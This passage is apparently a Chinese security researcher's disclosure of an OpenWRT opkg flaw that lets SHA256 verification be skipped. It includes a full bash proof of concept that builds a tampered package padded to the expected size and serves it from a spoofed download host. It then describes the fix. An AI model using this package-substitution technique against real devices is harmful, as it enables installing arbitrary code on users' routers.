如果指定了这个软件包的SHA256哈希值，该哈希值也必须匹配：
    1415      /* Check for sha256 value */
    1416      pkg_sha256 = pkg_get_sha256(pkg);
    1417      if (pkg_sha256) {
    1418              file_sha256 = file_sha256sum_alloc(local_filename);
    1419              if (file_sha256 && strcmp(file_sha256, pkg_sha256)) {
    1420                      if (!conf->force_checksum) {
    1421                              opkg_msg(ERROR,
    1422                                       "Package %s sha256sum mismatch. "
    1423                                       "Either the opkg or the package index are corrupt. "
    1424                                       "Try 'opkg update'.n", pkg->name);
    1425                              free(file_sha256);
    1426                              return -1;
    1427                      } else {
    1428                              opkg_msg(NOTICE,
    1429                                       "Ignored %s sha256sum mismatch.n",
    1430                                       pkg->name);
    1431                      }
    1432              }
    1433              if (file_sha256)
    1434                      free(file_sha256);
    1435      }
但是因为`checksum_hex2bin`没有办法对`SHA256sum`字段进行解码，所以1418行之后的代码被直接跳过。
这个漏洞很像三年前，在2017年2月发现的一个漏洞：
## 漏洞的利用
为了利用这个漏洞，攻击者需要在一个Web服务器上提供（受损的）软件包。
为此，攻击者必须能够拦截并替换设备与`downloads.openwrt.org`之间的通信，或者控制设备使用的DNS服务器，让`downloads.openwrt.org`指向攻击者控制的web服务器。
如果攻击者与设备处在同一网络中，攻击者可以使用数据包欺骗或者ARP缓存感染的方式进行攻击，但是我还没测试过这种情况。
唯一的限制条件就是，受损软件包大小要和软件包列表中的`Size`字段相匹配。
要实现这点很简单：
1、创建一个小于原始包的受损软件包；  
2、计算原始包与受损软件包之间的大小差异；  
3、在受损软件包后添加相同数量的0字节；
下面的PoC说明了如何实现漏洞利用：
    #!/bin/bash
    # 从镜像下载软件包列表
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.gz
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.sig
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.gz
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.sig
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.gz
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.sig
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.gz
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.sig
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.gz
    wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.sig
    wget -x http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.gz
    wget -x http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.sig
    mv downloads.openwrt.org/snapshots .
    rm -rf downloads.openwrt.org/
    # 获得原始软件包
    wget http://downloads.openwrt.org/snapshots/packages/x86_64/packages/attr_2.4.48-2_x86_64.ipk
    ORIGINAL_FILESIZE=$(stat -c%s "attr_2.4.48-2_x86_64.ipk")
    tar zxf attr_2.4.48-2_x86_64.ipk
    rm attr_2.4.48-2_x86_64.ipk
    # 提取二进制文件
    mkdir data/
    cd data/
    tar zxvf ../data.tar.gz
    rm ../data.tar.gz
    # 创建用于替换的二进制文件，这是一个很小的程序，只打印一个字符串。
    rm -f /tmp/pwned.asm /tmp/pwned.o
    echo "section  .text" >>/tmp/pwned.asm
    echo "global   _start" >>/tmp/pwned.asm
    echo "_start:" >>/tmp/pwned.asm
    echo " mov  edx,len" >>/tmp/pwned.asm
    echo " mov  ecx,msg" >>/tmp/pwned.asm
    echo " mov  ebx,1" >>/tmp/pwned.asm
    echo " mov  eax,4" >>/tmp/pwned.asm
    echo " int  0x80" >>/tmp/pwned.asm
    echo " mov  eax,1" >>/tmp/pwned.asm
    echo " int  0x80" >>/tmp/pwned.asm
    echo "section  .data" >>/tmp/pwned.asm
    echo "msg  db  'pwned :)',0xa" >>/tmp/pwned.asm
    echo "len  equ $ - msg" >>/tmp/pwned.asm
    # 编译
    nasm /tmp/pwned.asm -f elf64 -o /tmp/pwned.o
    # 链接
    ld /tmp/pwned.o -o usr/bin/attr
    # 压缩进data.tar.gz
    tar czvf ../data.tar.gz *
    cd ../
    # 移除不需要的文件
    rm -rf data/
    # 压缩
    tar czvf attr_2.4.48-2_x86_64.ipk control.tar.gz data.tar.gz debian-binary
    # 移除不需要的文件
    rm control.tar.gz data.tar.gz debian-binary
    # 计算原始软件包和受损软件包间的大小差异
    MODIFIED_FILESIZE=$(stat -c%s "attr_2.4.48-2_x86_64.ipk")
    FILESIZE_DELTA="$(($ORIGINAL_FILESIZE-$MODIFIED_FILESIZE))"
    # 向受损软件包中填充对应数量的0字节
    head /dev/zero -c$FILESIZE_DELTA >>attr_2.4.48-2_x86_64.ipk
    # 下载attr的依赖项
    wget http://downloads.openwrt.org/snapshots/packages/x86_64/packages/libattr_2.4.48-2_x86_64.ipk
    # 将在web server上提供服务的文件放入对应位置
    mkdir -p snapshots/packages/x86_64/packages/
    mv attr_2.4.48-2_x86_64.ipk snapshots/packages/x86_64/packages/
    mv libattr_2.4.48-2_x86_64.ipk snapshots/packages/x86_64/packages/
    # 启动opkg要连接的web服务器
    sudo python -m SimpleHTTPServer 80
假设Web服务器的IP地址为`192.168.2.10`，在OpenWRT系统上运行如下命令：
    echo "192.168.2.10 downloads.openwrt.org" >>/etc/hosts; opkg update && opkg install attr && attr
漏洞修复之前，上面的命令执行后会输出`pwned :)`。
注意命令中对`/etc/hosts`文件的修改是必须的，因为要模拟中间人（或者说破坏DNS）攻击
## 如何防范
在我报告这个漏洞后不久，OpenWRT就把软件包列表中`SHA256sum`字段的空格去掉了。
这么做可以减轻用户的风险，在此之后更新软件包列表的用户不易再受攻击，因为软件包安装过程不会再跳过哈希验证步骤。
但是这并不是一个长期解决方案，因为攻击者只需要提供一个OpenWRT签名的旧版本软件包列表就可以绕过该方法。
这个[commit](https://git.openwrt.org/?p=project/opkg-lede.git;a=commit;h=c09fe2098718807ddbca13ee36e3e38801822946)已经修复了`checksum_hex2bin`zh中的漏洞，并将其整合到了OpenWRTde
18.06.7和19.07.1版本中，这两个版本已于2020年2月1日发布。
我的建议是将OpenWRT版本升级到18.06.7或19.07.1。
## 补充笔记
早在2016年，Google Project Zero的Jann Horn就在Debian的apt包管理器中发现了一个类似的漏洞。
去年，Max Justicz发现了另一个相似的漏洞。